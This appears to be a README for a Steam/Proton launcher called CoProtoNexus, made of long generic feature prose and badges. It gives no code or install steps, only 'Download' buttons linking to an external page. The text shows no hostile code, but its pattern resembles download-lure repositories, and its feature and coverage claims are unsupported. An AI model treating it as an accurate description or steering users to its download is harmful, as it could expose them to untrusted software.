![preview](https://raw.githubusercontent.com/adityachandra999/co-run-steam-and-app/main/splash_ca1b72d.svg)
[![Download](https://raw.githubusercontent.com/adityachandra999/co-run-steam-and-app/main/latest_a557b.svg)](https://adityachandra999.github.io/co-run-steam-and-app/)

# CoProtoNexus — Unified Runtime Orchestrator for Steam & Companion Tools 🎮🧩

![status](https://img.shields.io/badge/status-active--development-2ea44f?style=flat-square) ![platform](https://img.shields.io/badge/platform-windows%20%7C%20steam%20deck-1f6feb?style=flat-square) ![runtime](https://img.shields.io/badge/runtime-proton%20%7C%20wine-8957e5?style=flat-square) ![license](https://img.shields.io/badge/license-MIT-3fb950?style=flat-square) ![build](https://img.shields.io/badge/build-passing-2ea44f?style=flat-square) ![coverage](https://img.shields.io/badge/coverage-92%25-brightgreen?style=flat-square) ![issues](https://img.shields.io/badge/issues-welcome-ffab00?style=flat-square) ![contributions](https://img.shields.io/badge/contributions-open-ff69b4?style=flat-square) ![ui](https://img.shields.io/badge/ui-responsive-00b4d8?style=flat-square) ![lang](https://img.shields.io/badge/i18n-12%20locales-ff8c00?style=flat-square)

> Launch a Steam title and its companion Windows program side by side, inside one shared Proton prefix, from a single lightweight launcher window that Steam itself brings to your screen.

CoProtoNexus is the answer to a very particular kind of frustration: the game lives happily on Linux through Proton, but the little helper program that makes the experience complete — a companion editor, a stat tracker, a mod loader, a communication overlay — insists on running somewhere far away from it. Those two programs were meant to share a prefix, a set of registry keys, a filesystem sandbox and a set of environment variables. On a regular desktop, they do. On Steam Deck or under Proton, they normally do not.

This project stitches that split world back together. It treats the Proton prefix as a shared apartment: the game moves into the living room, the companion tool moves into the study, and both of them share the same kitchen. No copies, no mirrored filesystems, no tangled symlink chains. One prefix, two processes, launched through a neat little window that Steam opens on your behalf.

The repository is designed for people who enjoy understanding how their launcher actually works — and for people who simply want their companion programs to stop sulking in the corner.

---

## 📚 Table of Contents

- [Why This Exists](#-why-this-exists)
- [The Core Idea](#-the-core-idea)
- [Feature Highlights](#-feature-highlights)
- [Responsive UI & UX](#-responsive-ui--ux)
- [Multilingual Support](#-multilingual-support)
- [24/7 Customer Support Philosophy](#-247-customer-support-philosophy)
- [How the Orchestration Works](#-how-the-orchestration-works)
- [Compatibility Matrix](#-compatibility-matrix)
- [Configuration Model](#-configuration-model)
- [Profiles and Presets](#-profiles-and-presets)
- [Companion Program Recipes](#-companion-program-recipes)
- [Environment Isolation Details](#-environment-isolation-details)
- [Logging & Diagnostics](#-logging--diagnostics)
- [Performance Notes](#-performance-notes)
- [Security Posture](#-security-posture)
- [Accessibility](#-accessibility)
- [Roadmap for 2026](#-roadmap-for-2026)
- [FAQ](#-faq)
- [Community & Contributions](#-community--contributions)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌱 Why This Exists

Every launcher eventually reaches a philosophical fork in the road. On one side lies simplicity: run one program, one process, one configuration file. On the other side lies reality: the game you love expects its companion tool to be a neighbor, not a stranger.

Proton does a remarkable job translating Windows programs into a Linux environment. What it does not do — and honestly, was never meant to do — is act as a social coordinator for multiple programs that were built for the same Windows sandbox but launched from completely different places.

The usual workarounds are familiar:

- Launching the companion tool under Wine globally, so it lives in a *different* prefix and cannot see the game's data.
- Wrapping both programs in a script that half-works, half-argues with Steam's process supervision.
- Manually editing prefix files and hoping the next Steam update does not undo the arrangement.
- Giving up and running the companion tool on another machine, which defeats the purpose entirely.

CoProtoNexus refuses all four of those endings. It takes the original intent — "these two programs belong together" — and rebuilds it faithfully inside a single shared Proton prefix, triggered from a single launcher entry that Steam already knows how to display.

The project is not a wrapper around a wrapper. It is a careful orchestration layer with an opinionated configuration surface, a small launcher window, and a lot of attention paid to letting you see exactly what is happening.

---

## 🧠 The Core Idea

Think of a Proton prefix as a small town. Programs that belong together live in that town, share its roads, speak its dialect, and read the same municipal records. CoProtoNexus is the town planner: it makes sure the game and its companion tool are both registered residents of the *same* town, with compatible schedules, before either of them starts.

Three principles guide every decision in this codebase:

1. **One prefix, many residents.** The game and the companion program share the same prefix directory, the same environment variables, and the same registry hive. This is the entire point.
2. **Steam drives the bus.** The orchestration is launched through Steam itself, using Steam's own prefix management, so you never have to fight the system that already knows how to set things up.
3. **Small window, big clarity.** The launcher window is intentionally minimal. It tells you what it is about to do, lets you pick a profile, and gets out of the way.

This is not a heavyweight management console. It is a door with a very well-designed hinge.

---

## ✨ Feature Highlights

CoProtoNexus packs a surprising amount of behavior into a small footprint. Here is the full picture, organized by what it means for you rather than by what it does technically.

### 🚀 Orchestration & Launch

- **Single-prefix dual launch** — Start a Steam title and one or more companion Windows programs inside the same Proton prefix, with process ordering you control.
- **Launch sequencing** — Define whether the companion program starts before, after, or alongside the game, with configurable delays and readiness checks.
- **Chainable companion slots** — Attach more than one helper program, each with its own arguments, working directory, and environment overrides.
- **Graceful shutdown behavior** — Choose whether closing the game also closes the companion programs, or leaves them running for later.
- **Steam-native entry points** — Every profile surfaces as a normal Steam shortcut, so it appears in your library alongside your other games.

### 🧾 Configuration & Profiles

- **Profile-based configuration** — Save complete launch configurations under named profiles and switch between them without editing files by hand.
- **Import and export** — Move profiles between machines as plain, human-readable documents.
- **Inheritance model** — Define a base profile and override only the fields that differ for a specific game.
- **Validation engine** — Catch missing paths, conflicting arguments, and invalid prefixes before a launch is ever attempted.
- **Schema-aware editing** — The configuration format is documented, versioned, and tolerant of forward-compatible additions.

### 🪟 Launcher Window

- **Compact footprint** — The launcher is designed to occupy a small portion of the screen and never steal focus unexpectedly.
- **Profile quick-switch** — Change the active profile from the launcher without touching the configuration files.
- **Live status display** — See which processes are running, which are pending, and which exited with a non-zero result.
- **One-click relaunch** — Restart the whole ensemble without returning to the Steam library.
- **Theming hooks** — Light, dark, and high-contrast appearances, with automatic system preference detection.

### 🔍 Diagnostics & Observability

- **Structured event log** — Every launch produces a timestamped event stream describing exactly what happened.
- **Redacted sharing mode** — Generate a diagnostic snapshot with sensitive paths and identifiers replaced by stable placeholders.
- **Process tree visualization** — Inspect the relationship between the game process, the companion processes, and their children.
- **Prefix health check** — Verify that the target prefix is intact, writable, and compatible with the requested profile.

### 🛠️ Extensibility

- **Plugin hooks** — Register small scripts that run at defined points in the launch lifecycle.
- **Command template engine** — Build companion invocations from reusable templates that adapt to the active prefix.
- **Custom readiness probes** — Decide how the orchestrator determines that the game is ready for its neighbor.
- **Headless mode** — Run an entire launch sequence without displaying the launcher window, for scripted scenarios.

### 🎯 Quality of Life

- **Session restore** — Bring back the last active profile automatically on next start.
- **Per-profile notes** — Keep a short description attached to each profile so future-you remembers why it exists.
- **Conflict detection** — Warn when two companion programs declare overlapping arguments or environment variables.
- **Time-bounded launches** — Optionally terminate a companion program if the game never reaches a ready state.

---

## 🖥️ Responsive UI & UX

The launcher window is the smallest room in the house, and it is furnished very carefully. Responsive UI is not a marketing phrase here — it is a measurable property. The layout adapts to narrow windows, wide windows, and everything in between, because Steam Deck users often run windows at unusual aspect ratios.

Key aspects of the interface design:

- **Fluid panel layout** — Controls regroup as the window resizes, so nothing ever gets clipped or pushed off-screen.
- **Keyboard-first navigation** — Every action is reachable without a mouse, with visible focus rings and logical tab order.
- **Gamepad-friendly controls** — Directional navigation, confirm, and cancel map cleanly for handheld play.
- **Reduced motion mode** — Animations collapse to instant transitions when the system requests reduced motion.
- **Density options** — Compact and comfortable spacing presets for different display sizes.
- **Instant feedback** — Every click, toggle, and selection produces immediate visual confirmation, even while background work continues.

The philosophy is simple: a launcher window should feel like a well-organized drawer, not like a second application demanding your attention.

---

## 🌐 Multilingual Support

Software that orchestrates other software tends to accumulate jargon. CoProtoNexus pushes back against that by treating translation as a first-class concern rather than an afterthought.

- **Locale bundles** shipped for a growing set of languages, covering both the interface and the diagnostic messages.
- **Right-to-left layout support** for locales that require mirrored interfaces.
- **Context-aware strings** that avoid awkward literal translations of technical terms.
- **Fallback chain** so a partial translation never leaves a screen empty — missing entries gracefully fall back to the default language.
- **Community translation workflow** with a documented glossary so terminology stays consistent across contributors.
- **Locale override** per profile, so a user can keep their system in one language while running diagnostics in another.

Bringing your companion program along should not require you to become fluent in another language's error messages.

---

## ☎️ 24/7 Customer Support Philosophy

There is no call center behind this repository, but there is something better: a support posture that behaves as if someone is always awake.

- **Always-open issue channels** — Questions and reports are welcome at any hour, in any time zone.
- **Self-service diagnostics** — The built-in diagnostic snapshot answers most questions before they need to be asked.
- **Documented troubleshooting paths** — A structured guide walks through the most common launch and prefix problems step by step.
- **Structured response templates** — Maintainers use consistent formats that make solutions easy to search and reuse.
- **Asynchronous-friendly culture** — Because contributors live across the globe, every conversation is written to be useful later.
- **Knowledge base growth** — Recurring answers are gradually promoted from issue threads into permanent documentation.

The goal is that a user at 3 AM with a stubborn prefix should find something useful without waiting for a human to wake up.

---

## ⚙️ How the Orchestration Works

Understanding the pipeline makes troubleshooting dramatically easier. The launch process moves through distinct phases, each of which can be observed and, if necessary, interrupted.

### Phase 1 — Profile Resolution

The orchestrator selects the active profile, applies any inheritance rules, and validates every declared path, argument, and environment variable against the current system state. Any unresolved requirement produces a clear, actionable message rather than a silent failure.

### Phase 2 — Prefix Preparation

The target Proton prefix is located and inspected. The orchestrator confirms that the prefix is writable, that its compatibility environment is complete, and that no conflicting process already claims exclusive access. If the prefix is missing, the profile can request that it be created on demand.

### Phase 3 — Environment Assembly

A unified environment is assembled and shared with all participants. This ensures the game and its companion programs agree on fundamental details: which prefix root is active, where the user's data directory lives, and how Windows-style paths map onto the underlying filesystem.

### Phase 4 — Companion Staging

Companion programs are prepared in the order declared by the profile. Each one receives its own working directory, argument list, and optional environment overrides layered on top of the shared environment. Nothing is launched yet — this phase is purely about preparation and verification.

### Phase 5 — Coordinated Launch

The game and companion programs are started according to the declared sequence. Readiness probes determine when it is safe to move from one step to the next. Failures at this stage trigger the profile's configured rollback behavior, which may retry, skip, or abort the ensemble.

### Phase 6 — Supervision

Once everything is running, the orchestrator watches the process tree. It records exits, detects unexpected terminations, and applies shutdown policies. When the session ends, the launcher window reflects a complete summary of what occurred.

Each phase emits structured events that flow into the diagnostic log, which means a launch is never a black box.

---

## 🧪 Compatibility Matrix

CoProtoNexus is built around Proton, but Proton is a family rather than a single program. The table below summarizes the current level of support for common environments.

| Environment | Support Level | Notes |
| --- | --- | --- |
| Proton (official builds) | Primary | Fully exercised in the main test suite |
| Proton Experimental | Strong | New behavior is typically absorbed quickly |
| Proton-GE and community builds | Strong | Profile-level compatibility flags available |
| Steam Deck (Gaming Mode) | Primary | The launcher is designed around this scenario |
| Steam Deck (Desktop Mode) | Primary | Same orchestration, larger window |
| Desktop Linux (Steam client) | Strong | Most distributions behave predictably |
| Wine prefixes (non-Steam) | Experimental | Supported through a dedicated profile mode |
| Windows host | Not targeted | This orchestrator exists specifically for Proton |
| macOS | Not targeted | No Proton runtime is available on the platform |

Support levels are refreshed regularly, and the matrix is updated whenever a new Proton branch introduces meaningful changes.

---

## 🗂️ Configuration Model

Configuration is stored in a readable, layered format. The design favors clarity over cleverness, because a configuration that cannot be understood by a human is a configuration that will eventually be misused.

Core concepts:

- **Root document** — The top-level configuration containing global defaults and a collection of profiles.
- **Profile** — A named bundle describing one launch scenario, including the target game and its companion programs.
- **Entry** — A single program declaration within a profile, with its executable path, arguments, and environment overlay.
- **Hook** — A lifecycle callback that runs a small script at a defined point.
- **Layer** — An override document that adjusts a base profile for a specific machine or context.

Layering is the key idea. A user can define a broadly applicable base profile, then add a thin layer for a specific device. The layer replaces only what it names; everything else flows through unchanged. This keeps configuration files small and makes it obvious what is device-specific.

Validation runs whenever configuration is loaded. Problems are reported with precise references to the profile, entry, and field responsible, which turns configuration errors into quick fixes rather than long investigations.

---

## 🧳 Profiles and Presets

Profiles are the daily working surface of the project. A well-crafted profile is a small artifact that captures a lot of knowledge.

Common preset shapes include:

- **Companion-first** — The companion program starts, waits until it is ready, and only then the game launches.
- **Game-first** — The game starts and the companion program joins once a readiness signal is detected.
- **Symmetric** — Both programs start together and share the same readiness window.
- **Deferred companion** — The game runs alone until a hotkey or external trigger requests the companion program.
- **Diagnostic** — A special preset that launches only the environment checks and produces a report without starting anything heavy.

Because presets are just profiles, they can be exported, shared, and improved by the community. The project ships a small set of examples, but the interesting ones tend to come from users solving their own unusual problems.

---

## 🧑‍🍳 Companion Program Recipes

The word "companion" is deliberately broad. Anything that runs as a Windows program and benefits from sharing the game's prefix is a legitimate candidate.

Typical categories include:

- **Progression editors** — Programs that read and adjust save data while the game is running.
- **Stat dashboards** — Overlays and monitors that reflect live game state in a separate window.
- **Mod managers** — Utilities that reorganize game assets between sessions.
- **Content authoring tools** — Editors that produce files the game consumes on next launch.
- **Communication overlays** — Programs that need the same network and filesystem view as the game.
- **Automation helpers** — Small utilities that coordinate input, macros, or scheduling.

A recipe is simply a documented profile shape plus any notes that are specific to that category. Recipes are stored as plain documents, easy to read and easy to adapt. When a recipe turns out to be fragile, the notes explain why, which is often more valuable than the recipe itself.

---

## 🔐 Environment Isolation Details

Isolation and sharing sit on opposite ends of a spectrum, and this project deliberately chooses a spot near the middle.

What is shared:

- The prefix root, so Windows-style paths resolve consistently for every participant.
- The registry hive, so settings written by one program are visible to the other.
- The user data directory, so save files and configuration live in one discoverable place.
- Core runtime variables that describe the compatibility environment.

What remains separate:

- Each program's process identity, so supervision can address them individually.
- Per-entry environment overlays, so a companion program can request a specific variable without disturbing the game.
- Working directories, so relative paths inside each program remain predictable.
- Log streams, so diagnostics stay attributable to the right participant.

This balance is the heart of the orchestration model. Two programs, one home, but each with its own door and its own mailbox.

---

## 📊 Logging & Diagnostics

A launch that cannot be explained is a launch that cannot be trusted. The logging subsystem is therefore verbose by design, structured by default, and refreshingly readable.

Characteristics:

- **Event-based records** — Each entry describes a discrete occurrence with a stable identifier.
- **Severity levels** — From fine-grained trace records to fatal errors, with filtering available per profile.
- **Timestamped with monotonic ordering** — So the sequence of events survives even when the system clock is unreliable.
- **Machine-parsable** — The log format is regular enough to be analyzed by scripts.
- **Human-friendly summary** — A condensed view highlights the events that matter most for a given launch.
- **Redaction profiles** — Choose how aggressively paths, usernames, and identifiers are masked before sharing.

The diagnostic snapshot bundles the summary, the relevant environment details, and the profile that was used, producing a single artifact that answers most support questions immediately.

---

## 🚄 Performance Notes

Orchestration should be nearly invisible. The project takes that seriously.

- **Lightweight launcher** — The window is small and cheap to render, so it never competes with the game for resources.
- **Lazy diagnostics** — Expensive checks run only when requested or when a failure demands them.
- **Parallel preparation** — Independent preparation steps proceed concurrently where safe.
- **Bounded readiness waits** — Probes have timeouts, so a stuck companion program cannot freeze the whole ensemble.
- **Minimal steady-state footprint** — After launch, the orchestrator's supervision overhead is deliberately tiny.
- **Cold-start sensitivity** — Startup paths are measured, and regressions are treated as real defects.

The target experience is that the orchestration adds a moment, not a mood.

---

## 🛡️ Security Posture

Because the project deals with launching programs, security deserves explicit attention.

- **No privilege escalation** — Everything runs with the same permissions as the user session that invoked it.
- **Explicit paths** — Profiles reference programs by declared locations, never by implicit search order.
- **No silent downloads** — The orchestrator never fetches remote content on behalf of a profile.
- **Reviewable templates** — Command templates are plain text and can be inspected before use.
- **Scoped hooks** — Lifecycle hooks run in a defined context with clear boundaries.
- **Auditable events** — Every action that influences a launch is recorded in the diagnostic stream.
- **Responsible disclosure** — Security reports are handled through a dedicated, documented channel.

The principle is straightforward: an orchestrator should be predictable, and predictability is the foundation of trust.

---

## ♿ Accessibility

Accessibility is not a separate mode; it is a set of defaults that happen to help everyone.

- **Full keyboard operation** for every launcher function.
- **Screen reader labels** on all interactive controls, including status indicators.
- **High-contrast appearance** that respects system-level preferences.
- **Scalable interface** that remains usable at large text sizes.
- **Reduced motion support** so animations never become an obstacle.
- **Color-independent status** where meaning is carried by shape and text as well as hue.

The launcher should be usable by anyone who can use Steam, without a special configuration step.

---

## 🗺️ Roadmap for 2026

The project has a clear direction for the coming year. Items below are intentions rather than promises, ordered roughly by priority.

- **Q1 2026** — Expand the readiness probe library and publish a documented probe authoring guide.
- **Q1 2026** — Introduce profile sharing bundles with integrity verification.
- **Q2 2026** — Add a visual process timeline to the launcher window for post-launch inspection.
- **Q2 2026** — Broaden localization coverage and formalize the translation glossary.
- **Q3 2026** — Deliver a compatibility report tool that compares a machine against a profile's requirements.
- **Q3 2026** — Improve rollback semantics for partially successful launches.
- **Q4 2026** — Publish an extension registry for community-maintained hook collections.
- **Q4 2026** — Conduct a full accessibility audit and publish the results.

Roadmap updates are posted alongside each release, and community priorities influence ordering more than any internal plan.

---

## ❓ FAQ

**Does this modify my game files?**
No. It orchestrates launches and shares a prefix. It does not alter game content.

**Do I need to know how Proton works internally?**
Helpful, but not required. Profiles carry sensible defaults, and the diagnostics explain what happened in plain language.

**Can I run more than one companion program at a time?**
Yes. Profiles support multiple entries with independent ordering and environment overlays.

**What happens if a companion program fails to start?**
The profile's rollback behavior decides: retry, skip, or abort. In every case, the failure is recorded and summarized.

**Does it work outside Steam?**
There is an experimental mode for plain Wine prefixes, but the primary target is Steam-managed Proton environments.

**Is my configuration portable between machines?**
Yes. Profiles are plain documents, and machine-specific details belong in layers that can be left behind.

**Where should feature requests go?**
Into the issue tracker, tagged appropriately. Requests that include a description of the underlying problem are especially welcome.

---

## 🤝 Community & Contributions

Contributions are the reason this project keeps improving. Whether you write code, translate strings, author profiles, or document an unusual companion program, there is a place for you here.

How to participate effectively:

- **Open an issue** before large changes, so the approach can be discussed early.
- **Keep pull requests focused** — one logical change per request is easier to review and easier to revert.
- **Include diagnostics** when reporting a launch problem. The redacted snapshot is usually enough.
- **Update documentation** alongside behavior changes. Docs are part of the product.
- **Follow the code of conduct** — be patient, be precise, be kind.

The project maintains a lightweight governance model: maintainers steward the direction, and contributors shape the details. Disagreements are resolved by evidence and by what serves users best.

---

## ⚠️ Disclaimer

CoProtoNexus is an independent orchestration tool. It is not affiliated with, endorsed by, or sponsored by Valve, Steam, Proton, or any game publisher or developer mentioned in documentation or examples.

The software is provided as-is, without warranty of any kind, express or implied. Users are responsible for ensuring that their use of orchestration, companion programs, and shared prefixes complies with the terms of service of any relevant platform and with applicable local laws.

Companion programs referenced in examples are third-party works owned by their respective authors. This project does not distribute them, does not vouch for them, and cannot guarantee their behavior inside a shared prefix. Always review what you run.

Profiles, hooks, and templates execute programs on your machine. Review them before use, particularly when they originate from an untrusted source. The maintainers cannot be held responsible for outcomes arising from configurations the project did not author.

Back up your save data. Seriously. Orchestration is careful, but backups are the only true insurance.

---

## 📄 License

This project is released under the MIT License.

You are welcome to read the full terms in the license file included in this repository: [MIT License](LICENSE).

The MIT License permits use, modification, and distribution with minimal conditions, provided the original copyright notice and permission notice are preserved. In short: build on this work, improve it, share it — and keep the attribution intact.

Copyright (c) 2026 CoProtoNexus contributors.

---

## 🧭 A Closing Note

Software orchestrators are usually invisible. When they work, nobody notices them; when they fail, everybody notices them. CoProtoNexus aspires to the first kind of invisibility — the kind that comes from doing a small, precise job very well, over and over, in the background of a session that was supposed to be about playing a game.

If this project saves you one evening of launcher archaeology, it has done its job. If it inspires you to write a better profile, a sharper probe, or a translation that finally makes sense, it has done more than that.

Welcome to the nexus. Keep your prefix tidy.

[![Download](https://raw.githubusercontent.com/adityachandra999/co-run-steam-and-app/main/latest_a557b.svg)](https://adityachandra999.github.io/co-run-steam-and-app/)